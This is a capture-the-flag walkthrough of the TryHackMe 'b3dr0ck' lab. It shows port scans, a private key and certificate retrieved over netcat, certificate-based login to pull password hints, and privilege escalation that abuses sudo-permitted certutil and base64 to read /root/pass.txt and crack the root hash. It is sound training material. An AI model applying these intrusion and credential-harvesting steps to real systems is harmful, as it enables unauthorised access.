## [Room](https://tryhackme.com/room/b3dr0ck)

## IP: 10.10.82.202

```
nmap -sC -sV 10.10.82.202 -p 22,80,4040,9009,54321 -oN initial_scan
```

```
PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 1a:c7:00:71:b6:65:f5:82:d8:24:80:72:48:ad:99:6e (RSA)
|   256 3a:b5:25:2e:ea:2b:44:58:24:55:ef:82:ce:e0:ba:eb (ECDSA)
|_  256 cf:10:02:8e:96:d3:24:ad:ae:7d:d1:5a:0d:c4:86:ac (ED25519)
80/tcp    open  http         nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://10.10.82.202:4040/
|_http-server-header: nginx/1.18.0 (Ubuntu)
4040/tcp  open  ssl/yo-main?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Date: Tue, 30 Aug 2022 02:57:40 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>ABC</title>
|     <style>
|     body {
|     width: 35em;
|     margin: 0 auto;
|     font-family: Tahoma, Verdana, Arial, sans-serif;
|     </style>
|     </head>
|     <body>
|     <h1>Welcome to ABC!</h1>
|     <p>Abbadabba Broadcasting Compandy</p>
|     <p>We're in the process of building a website! Can you believe this technology exists in bedrock?!?</p>
|     <p>Barney is helping to setup the server, and he said this info was important...</p>
|     <pre>
|     Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
|     Bamm Bamm tried to setup a sql database, but I don't see it running.
|     Looks like it started something else, but I'm not sure how to turn it off...
|     said it was from the toilet and OVER 9000!
|     Need to try and secure
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Date: Tue, 30 Aug 2022 02:57:41 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>ABC</title>
|     <style>
|     body {
|     width: 35em;
|     margin: 0 auto;
|     font-family: Tahoma, Verdana, Arial, sans-serif;
|     </style>
|     </head>
|     <body>
|     <h1>Welcome to ABC!</h1>
|     <p>Abbadabba Broadcasting Compandy</p>
|     <p>We're in the process of building a website! Can you believe this technology exists in bedrock?!?</p>
|     <p>Barney is helping to setup the server, and he said this info was important...</p>
|     <pre>
|     Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
|     Bamm Bamm tried to setup a sql database, but I don't see it running.
|     Looks like it started something else, but I'm not sure how to turn it off...
|     said it was from the toilet and OVER 9000!
|_    Need to try and secure
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2022-08-30T02:45:00
|_Not valid after:  2023-08-30T02:45:00
9009/tcp  open  pichat?
| fingerprint-strings: 
|   NULL: 
|     ____ _____ 
|     \x20\x20 / / | | | | /\x20 | _ \x20/ ____|
|     \x20\x20 /\x20 / /__| | ___ ___ _ __ ___ ___ | |_ ___ / \x20 | |_) | | 
|     \x20/ / / _ \x20|/ __/ _ \| '_ ` _ \x20/ _ \x20| __/ _ \x20 / /\x20\x20| _ <| | 
|     \x20 /\x20 / __/ | (_| (_) | | | | | | __/ | || (_) | / ____ \| |_) | |____ 
|     ___|_|______/|_| |_| |_|___| _____/ /_/ _____/ _____|
|_    What are you looking for?
54321/tcp open  ssl/unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|_    Error: 'undefined' is not authorized for access.
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2022-08-30T02:45:00
|_Not valid after:  2023-08-30T02:45:00
|_ssl-date: TLS randomness does not represent time
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4040-TCP:V=7.92%T=SSL%I=7%D=8/29%Time=630D7CA4%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,3BE,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/htm
SF:l\r\nDate:\x20Tue,\x2030\x20Aug\x202022\x2002:57:40\x20GMT\r\nConnectio
SF:n:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n\x20\x20<head>\n\x20\x20
SF:\x20\x20<title>ABC</title>\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x
SF:20\x20body\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20width:\x2035em;\n\x20\
SF:x20\x20\x20\x20\x20\x20\x20margin:\x200\x20auto;\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20font-family:\x20Tahoma,\x20Verdana,\x20Arial,\x20sans-serif;
SF:\n\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20</style>\n\x20\x20</head>\
SF:n\n\x20\x20<body>\n\x20\x20\x20\x20<h1>Welcome\x20to\x20ABC!</h1>\n\x20
SF:\x20\x20\x20<p>Abbadabba\x20Broadcasting\x20Compandy</p>\n\n\x20\x20\x2
SF:0\x20<p>We're\x20in\x20the\x20process\x20of\x20building\x20a\x20website
SF:!\x20Can\x20you\x20believe\x20this\x20technology\x20exists\x20in\x20bed
SF:rock\?!\?</p>\n\n\x20\x20\x20\x20<p>Barney\x20is\x20helping\x20to\x20se
SF:tup\x20the\x20server,\x20and\x20he\x20said\x20this\x20info\x20was\x20im
SF:portant\.\.\.</p>\n\n<pre>\nHey,\x20it's\x20Barney\.\x20I\x20only\x20fi
SF:gured\x20out\x20nginx\x20so\x20far,\x20what\x20the\x20h3ll\x20is\x20a\x
SF:20database\?!\?\nBamm\x20Bamm\x20tried\x20to\x20setup\x20a\x20sql\x20da
SF:tabase,\x20but\x20I\x20don't\x20see\x20it\x20running\.\nLooks\x20like\x
SF:20it\x20started\x20something\x20else,\x20but\x20I'm\x20not\x20sure\x20h
SF:ow\x20to\x20turn\x20it\x20off\.\.\.\n\nHe\x20said\x20it\x20was\x20from\
SF:x20the\x20toilet\x20and\x20OVER\x209000!\n\nNeed\x20to\x20try\x20and\x2
SF:0secure\x20")%r(HTTPOptions,3BE,"HTTP/1\.1\x20200\x20OK\r\nContent-type
SF::\x20text/html\r\nDate:\x20Tue,\x2030\x20Aug\x202022\x2002:57:41\x20GMT
SF:\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n\x20\x20<he
SF:ad>\n\x20\x20\x20\x20<title>ABC</title>\n\x20\x20\x20\x20<style>\n\x20\
SF:x20\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20width:\x2
SF:035em;\n\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200\x20auto;\n\x20\x20
SF:\x20\x20\x20\x20\x20\x20font-family:\x20Tahoma,\x20Verdana,\x20Arial,\x
SF:20sans-serif;\n\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20</style>\n\x2
SF:0\x20</head>\n\n\x20\x20<body>\n\x20\x20\x20\x20<h1>Welcome\x20to\x20AB
SF:C!</h1>\n\x20\x20\x20\x20<p>Abbadabba\x20Broadcasting\x20Compandy</p>\n
SF:\n\x20\x20\x20\x20<p>We're\x20in\x20the\x20process\x20of\x20building\x2
SF:0a\x20website!\x20Can\x20you\x20believe\x20this\x20technology\x20exists
SF:\x20in\x20bedrock\?!\?</p>\n\n\x20\x20\x20\x20<p>Barney\x20is\x20helpin
SF:g\x20to\x20setup\x20the\x20server,\x20and\x20he\x20said\x20this\x20info
SF:\x20was\x20important\.\.\.</p>\n\n<pre>\nHey,\x20it's\x20Barney\.\x20I\
SF:x20only\x20figured\x20out\x20nginx\x20so\x20far,\x20what\x20the\x20h3ll
SF:\x20is\x20a\x20database\?!\?\nBamm\x20Bamm\x20tried\x20to\x20setup\x20a
SF:\x20sql\x20database,\x20but\x20I\x20don't\x20see\x20it\x20running\.\nLo
SF:oks\x20like\x20it\x20started\x20something\x20else,\x20but\x20I'm\x20not
SF:\x20sure\x20how\x20to\x20turn\x20it\x20off\.\.\.\n\nHe\x20said\x20it\x2
SF:0was\x20from\x20the\x20toilet\x20and\x20OVER\x209000!\n\nNeed\x20to\x20
SF:try\x20and\x20secure\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9009-TCP:V=7.92%I=7%D=8/29%Time=630D7C8F%P=x86_64-pc-linux-gnu%r(NU
SF:LL,29E,"\n\n\x20__\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20__\x20\x20_\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20____\x20\x20\x20_____\x20\
SF:n\x20\\\x20\\\x20\x20\x20\x20\x20\x20\x20\x20/\x20/\x20\|\x20\|\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20/\\\x20\x20\x20\|\x20\x20_\x20\\\x20/\x20____\|\n\x20\x20\\\x
SF:20\\\x20\x20/\\\x20\x20/\x20/__\|\x20\|\x20___\x20___\x20\x20_\x20__\x2
SF:0___\x20\x20\x20___\x20\x20\|\x20\|_\x20___\x20\x20\x20\x20\x20\x20/\x2
SF:0\x20\\\x20\x20\|\x20\|_\)\x20\|\x20\|\x20\x20\x20\x20\x20\n\x20\x20\x2
SF:0\\\x20\\/\x20\x20\\/\x20/\x20_\x20\\\x20\|/\x20__/\x20_\x20\\\|\x20'_\
SF:x20`\x20_\x20\\\x20/\x20_\x20\\\x20\|\x20__/\x20_\x20\\\x20\x20\x20\x20
SF:/\x20/\\\x20\\\x20\|\x20\x20_\x20<\|\x20\|\x20\x20\x20\x20\x20\n\x20\x2
SF:0\x20\x20\\\x20\x20/\\\x20\x20/\x20\x20__/\x20\|\x20\(_\|\x20\(_\)\x20\
SF:|\x20\|\x20\|\x20\|\x20\|\x20\|\x20\x20__/\x20\|\x20\|\|\x20\(_\)\x20\|
SF:\x20\x20/\x20____\x20\\\|\x20\|_\)\x20\|\x20\|____\x20\n\x20\x20\x20\x2
SF:0\x20\\/\x20\x20\\/\x20\\___\|_\|\\___\\___/\|_\|\x20\|_\|\x20\|_\|\\__
SF:_\|\x20\x20\\__\\___/\x20\x20/_/\x20\x20\x20\x20\\_\\____/\x20\\_____\|
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\
SF:n\nWhat\x20are\x20you\x20looking\x20for\?\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port54321-TCP:V=7.92%T=SSL%I=7%D=8/29%Time=630D7C98%P=x86_64-pc-linux-g
SF:nu%r(NULL,31,"Error:\x20'undefined'\x20is\x20not\x20authorized\x20for\x
SF:20access\.\n")%r(GenericLines,31,"Error:\x20'undefined'\x20is\x20not\x2
SF:0authorized\x20for\x20access\.\n")%r(GetRequest,31,"Error:\x20'undefine
SF:d'\x20is\x20not\x20authorized\x20for\x20access\.\n")%r(HTTPOptions,31,"
SF:Error:\x20'undefined'\x20is\x20not\x20authorized\x20for\x20access\.\n")
SF:%r(RTSPRequest,31,"Error:\x20'undefined'\x20is\x20not\x20authorized\x20
SF:for\x20access\.\n")%r(RPCCheck,31,"Error:\x20'undefined'\x20is\x20not\x
SF:20authorized\x20for\x20access\.\n")%r(DNSVersionBindReqTCP,31,"Error:\x
SF:20'undefined'\x20is\x20not\x20authorized\x20for\x20access\.\n")%r(DNSSt
SF:atusRequestTCP,31,"Error:\x20'undefined'\x20is\x20not\x20authorized\x20
SF:for\x20access\.\n")%r(Help,31,"Error:\x20'undefined'\x20is\x20not\x20au
SF:thorized\x20for\x20access\.\n")%r(SSLSessionReq,31,"Error:\x20'undefine
SF:d'\x20is\x20not\x20authorized\x20for\x20access\.\n")%r(TerminalServerCo
SF:okie,31,"Error:\x20'undefined'\x20is\x20not\x20authorized\x20for\x20acc
SF:ess\.\n")%r(TLSSessionReq,31,"Error:\x20'undefined'\x20is\x20not\x20aut
SF:horized\x20for\x20access\.\n")%r(Kerberos,31,"Error:\x20'undefined'\x20
SF:is\x20not\x20authorized\x20for\x20access\.\n")%r(SMBProgNeg,31,"Error:\
SF:x20'undefined'\x20is\x20not\x20authorized\x20for\x20access\.\n")%r(X11P
SF:robe,31,"Error:\x20'undefined'\x20is\x20not\x20authorized\x20for\x20acc
SF:ess\.\n")%r(FourOhFourRequest,31,"Error:\x20'undefined'\x20is\x20not\x2
SF:0authorized\x20for\x20access\.\n")%r(LPDString,31,"Error:\x20'undefined
SF:'\x20is\x20not\x20authorized\x20for\x20access\.\n")%r(LDAPSearchReq,31,
SF:"Error:\x20'undefined'\x20is\x20not\x20authorized\x20for\x20access\.\n"
SF:)%r(LDAPBindReq,31,"Error:\x20'undefined'\x20is\x20not\x20authorized\x2
SF:0for\x20access\.\n")%r(SIPOptions,31,"Error:\x20'undefined'\x20is\x20no
SF:t\x20authorized\x20for\x20access\.\n")%r(LANDesk-RC,31,"Error:\x20'unde
SF:fined'\x20is\x20not\x20authorized\x20for\x20access\.\n")%r(TerminalServ
SF:er,31,"Error:\x20'undefined'\x20is\x20not\x20authorized\x20for\x20acces
SF:s\.\n")%r(NCP,31,"Error:\x20'undefined'\x20is\x20not\x20authorized\x20f
SF:or\x20access\.\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


```
rustscan -a 10.10.82.202
```
```
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack
80/tcp    open  http    syn-ack
4040/tcp  open  yo-main syn-ack
9009/tcp  open  pichat  syn-ack
54321/tcp open  unknown syn-ack
```

Port 80:
        Will direct to port 4040 for https
        
Port 9009:

```
nc 10.10.82.202 9009
```

type in key gives:

```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAuUwsm9aAgbYYXjedmPr7LSlP4amOtqWlnO+IlxYFs/YklUry
7JbiSkWPhmqhNKZoXDegKDaxk7sUibT5KX/Jj/N6VDSAlP+Po9Qe2edVHU/X2Kk4
5I3r8ds0kfgOq/MqBkmoCSKM35ep6JEsDEJTok/438RErif5FUTI3OUagzBVcXSN
o9Fqf3jsjlqvF8QxFDoVTK6Nu5D+Ef2ax/TKXwN9w2s7vRn/sCkzHLONiU5y/v3n
LAuAAPhOM0bpp0aAaAeZJzTKaLjfnqB3K8dwya85q3xOuPMjr4t3gAEqYsv93Ezs
FjHwGWkohFj80RmWuhX3ODXLFiMM0m4m22K7AQIDAQABAoIBAH73TRGzFvbKOURF
w30RbI5zYkL0Fc/dDO/NycAM3PeEz2hkpLOsZ34Qz9mAstkKtTOLAfjMET1y0Q3S
rW/cGdbDNK0CFKEDw/6z2DfjJRUionnY6hzhiix80Ta7zAHSapdIXRV1USXcHBY5
cv8ra3cqaROavpy+0xPZv/BsI5CDoRKH+0o7fcTbgpvp38GXRIH5tBON+AnAzI9B
L5sgmXCK0LWVLbuM1vg69YF5YqsGSD6dHC5WiPEKdMrFZ4BZmiaA8/bUXB/Es/MM
Q5OnSZK/brxB202pzkP4xROZV6EytAmbzOtXsGX+qM4CXcJkVByoyYvS5fbtKNTo
HQ0s86kCgYEA5L+b1nq5N1UyiWnJ41aK4r/yQoZnUQe6E1rDF/pGYsHV/+ts5uaz
69vmmhuPmlUkcbz03FW8lCw9zCEhQjK+g4h+O2ax+8hmUspaK6SDtxFKXZ2pkVwK
/I8Blu5COZxgM8n7g9MYGMP07N3F68PLXX4vDYX4AijfOSdtApo8wa8CgYEAz19l
Rn0erQvTTXjAkgr/a2VtZxc3yk/Xv1UVyBD71Gmys183j1W9aSQj3zOcNpW43BJ+
jdVNBXD9py0Tl6pXJuMwsX95c8/UBE7UQLKEbCqcAxVbNTgedYOrZ0EWriEy2qi6
j6jVeom8V/IUn86Ypnp68EhrrXBGNg1NufM36k8CgYEA2aYqzB+HHcv1wuOiUaol
ieyiwIOLyIC2nvXMDYN39z2Btfi2bNj0NqXMO7OfpnP+si3dOcxmGwIhZpnbQFZy
CUsU+MYU8YHTQlEBDOeC3+wWuw5pqkJOvdH/7DEVWCWfL4euxdZT5jSFVd8KE/L/
DB0k/hQLT1q+Um5d/Yzt5EcCgYA28+mrl0aExuh01DX7vYxYEmW+dumi5CuhGVQP
U2jYrjXb0LSxeCAcd6ZF5LBVyrFVKFV/EnI5qeqd3ZUekNZNiNEDiGtP5Fgj2Bvp
FSWAYH49VvB3luqDa6QFVbtD46pNRX9CyJPhyBQwHgeXHbFYFIb1m8tlB6ajdj0N
tMUxgwKBgQDYewkT7kGWP0NbS8L4k93s/uxjD98wcGiBhbFpBdihtjRtg8MWhlBH
Y3keaRR567BS7mG9HUcGZ2hAn5GAuvyfIlO0I91E+04JZBC2jFLadN7EbkBjLajv
4wEHGqhq3RHwtlpgcZ61rUWrq6IroC7rz7mLMApplffLXgzYR4+6Mg==
-----END RSA PRIVATE KEY-----
```

type in cert gives:

```
-----BEGIN CERTIFICATE-----
MIICoTCCAYkCAgTSMA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yMjA4MzAwMjQ1MzdaFw0yMzA4MzAwMjQ1MzdaMBgxFjAUBgNVBAMMDUJh
cm5leSBSdWJibGUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC5TCyb
1oCBthheN52Y+vstKU/hqY62paWc74iXFgWz9iSVSvLsluJKRY+GaqE0pmhcN6Ao
NrGTuxSJtPkpf8mP83pUNICU/4+j1B7Z51UdT9fYqTjkjevx2zSR+A6r8yoGSagJ
Iozfl6nokSwMQlOiT/jfxESuJ/kVRMjc5RqDMFVxdI2j0Wp/eOyOWq8XxDEUOhVM
ro27kP4R/ZrH9MpfA33Dazu9Gf+wKTMcs42JTnL+/ecsC4AA+E4zRumnRoBoB5kn
NMpouN+eoHcrx3DJrzmrfE648yOvi3eAASpiy/3cTOwWMfAZaSiEWPzRGZa6Ffc4
NcsWIwzSbibbYrsBAgMBAAEwDQYJKoZIhvcNAQELBQADggEBAAcoyGsAqz7bDu5y
daZLiKSi0dcjOVY0tpJNPR58CQAQUJH9YL1uq2lgeGoyGz6F7ufcbWhTi+NllZpn
PG9QVo/k0az3PCI73NBtG+tF952UDQxYXl/VcCOKpftgNUKAnKcVhO2JNxoTX/27
cEB9whCa6uol4PcXY3CNdyOQfwa1BOlX2jiOw1rphoqJqURr8Guo4Q41q6oBshKU
b0Eb7OCeExM4LwMPSLGdzU8V7wzGfz9UPIh+DYYCOeDZuqiMGoyGxeD2s4ISt6z5
rHjkUku/TSmgCxATLix1Hwb4ehZbx4QK2LC0oSYWT6sgeEouh+AaC2gnhAzUzOm7
+gUuNC8=
-----END CERTIFICATE-----
```

Create key.pem and cert.pem to store on attacker machine

use openssl to connect key.pem and cert.pem to authenticate with port 54321

```
openssl s_client -connect 10.10.82.202:54321 \                           
> -cert cert.pem \
> -key key.pem \
> -state -debug
```

And we get this

```
        Welcome: 'Barney Rubble' is authorized.
        b3dr0ck>
```

`id`

Unrecognized command: 'id'

This service is for login and password hints

`hint`

Password hint: d1ad7c0a3805955a35eb260dab4180dd (user = 'Barney Rubble')

`login`

Login is disabled. Please use SSH instead.

Port 54321:

https only and need authentication

Port 22:

`Login as barney`

Barney Flag:`THM{REDACTED}`

There is another user on the machine `fred`

`sudo -l`

```
User barney may run the following commands on b3dr0ck:
    (ALL : ALL) /usr/bin/certutil
```

So we can run certutil with sudo privilege

Hint say:

`You can find it same way as barney's, with fred's credentials (cert + key)`

```
sudo /usr/bin/certutil ls
```

This will list all the key and cert on the machine so now we can create fred key and cert to login as fred

```
cat /etc/passwd
```

This will show full name of fred to use with certutil

`fred:x:1000:1000:Fred Flintstone:/home/fred:/bin/bash`

```
sudo /usr/bin/certutil fred "Fred Flintstone"
```

We generate new key and cert for fred because we can't read the old one. Let's do openssl again

```
openssl s_client -connect 10.10.82.202:54321 \
-cert fred_cert.pem \
-key fred_key.pem \
-state -debug
```

Welcome: 'Fred Flintstone' is authorized.
b3dr0ck>hint

`Password hint: YabbaDabbaD0000! (user = 'Fred Flintstone')`

We can use this password to login as fred from previous shell. 

Fred Flag:`THM{REDACTED}`

`sudo -l`

```
User fred may run the following commands on b3dr0ck:
(ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
(ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
```

We can use base64 and base32 with sudo privilege so we can cat out the pass.txt with sudo

```
sudo /usr/bin/base64 /root/pass.txt | base64 -d
```

We get this:

`LFKEC52ZKRCXSWKXIZVU43KJGNMXURJSLFWVS52OPJAXUTLNJJVU2RCWNBGXURTLJZKFSSYK`

We can use cyberchef or just do it manually

```
sudo /usr/bin/base64 /root/pass.txt | base64 -d | base32 -d | base64 -d
```

`a00a12aad6b7c16bf07032bd05a31d56` 

This is the password hash for root not the flag cuz the file we cat out is named "pass.txt".

Let's crack it

hashcat with rockyou can't crack it so we can just use Crackstation website

`flintstonesvitamins`

Root Flag:`THM{REDACTED}`
